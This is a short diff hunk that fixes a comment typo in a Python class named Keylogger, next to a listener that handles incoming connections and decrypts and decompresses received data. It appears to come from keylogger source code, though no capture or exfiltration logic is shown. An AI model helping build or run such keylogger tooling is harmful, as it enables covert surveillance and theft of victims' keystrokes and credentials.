@@ -158,7 +158,7 @@ class Keylogger:
         plaintext = zlib.decompress(decrypted)
         return plaintext
 
-    # For the listener - handle a received a conncetion
+    # For the listener - handle a received a connection
     def handle(self, client_socket):
         # TODO idk if this try except is needed tbh
         try:
